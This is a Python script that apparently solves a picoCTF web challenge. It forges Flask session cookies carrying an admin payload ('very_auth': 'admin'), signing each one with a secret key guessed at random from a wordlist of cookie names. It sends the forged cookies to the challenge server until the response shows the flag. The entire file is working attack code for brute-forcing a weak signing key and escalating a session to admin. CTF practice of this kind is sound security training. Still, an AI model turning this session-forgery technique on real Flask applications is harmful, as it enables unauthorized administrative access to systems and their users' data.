import requests
import sys
import zlib
from itsdangerous import base64_decode
import ast
from flask.sessions import SecureCookieSessionInterface
import random
import re

class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key

def encode(secret_key, session_cookie_structure):
    """ Encode a Flask session cookie """
    try:
        app = MockApp(secret_key)

        session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
        si = SecureCookieSessionInterface()
        s = si.get_signing_serializer(app)

        return s.dumps(session_cookie_structure)
    except Exception as e:
        return "[Encoding error] {}".format(e)
        raise e

payload = '{ "very_auth": "admin" }'
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

i = 0
while i < 100:
    test_cookie = encode(random.choice(cookie_names), payload)
    test = requests.get('http://mercury.picoctf.net:18835/display', cookies = { "session": test_cookie } , allow_redirects = False)

    if 'Redirection' not in test.text:
        # We hit a match
        search = re.findall('picoCTF{.*}', test.text)
        if search:
            print(search)
            break

    i = i + 1
